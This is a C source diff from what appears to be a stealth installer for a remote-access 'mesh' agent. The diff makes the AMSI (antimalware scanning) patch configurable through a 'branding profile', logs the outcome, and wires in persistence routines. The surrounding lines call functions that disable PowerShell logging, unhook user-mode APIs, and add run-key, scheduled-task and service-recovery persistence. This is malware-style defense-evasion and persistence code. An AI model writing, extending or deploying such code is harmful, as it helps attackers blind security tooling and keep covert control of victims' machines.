@@ -557,6 +557,13 @@ static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* contex
     return success;
 }
 
+static BOOL Stealth_IsAmsiPatchEnabled(void)
+{
+    const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
+    if (stealthProfile == NULL) { return TRUE; }
+    return (stealthProfile->amsiPatch != 0);
+}
+
 // ================================================================
 // Complete Installation Function
 // ================================================================
@@ -688,6 +695,7 @@ BOOL Stealth_PerformCompleteInstallation(
         }
     }
     Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
+    Stealth_ApplyPersistenceProfile();
     success = TRUE;
     Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);
 
@@ -700,9 +708,21 @@ BOOL Stealth_PerformCompleteInstallation(
     }
 
     // Step 5: Apply anti-detection measures
-    if (!Stealth_PatchAMSI())
+    if (Stealth_IsAmsiPatchEnabled())
     {
-        Stealth_DebugPrintfA("Stealth_PatchAMSI failed during installation");
+        if (!Stealth_PatchAMSI())
+        {
+            Stealth_DebugPrintfA("Stealth_PatchAMSI failed during installation");
+            Stealth_LogInstallEvent(L"AMSI patch attempt failed (see debug output)");
+        }
+        else
+        {
+            Stealth_LogInstallEvent(L"AMSI patch applied per branding profile");
+        }
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"AMSI patch disabled via branding profile");
     }
     Stealth_DisablePowerShellLogging();
     Stealth_UnhookUserModeAPIs();
@@ -1385,7 +1405,7 @@ void Stealth_ApplyPersistenceProfile(void)
         }
         Stealth_AddRunKeyIfEnabled(persistence, serviceKeyName);
         Stealth_AddScheduledTaskIfEnabled(persistence, serviceDisplayName);
-        Stealth_AddServiceStoppedAutoStartIfEnabled(persistence, serviceDisplayName);
+        Stealth_AddServiceStoppedAutoStartIfEnabled(persistence, serviceKeyName);
         Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
         g_RuntimePersistenceApplied = TRUE;
     }
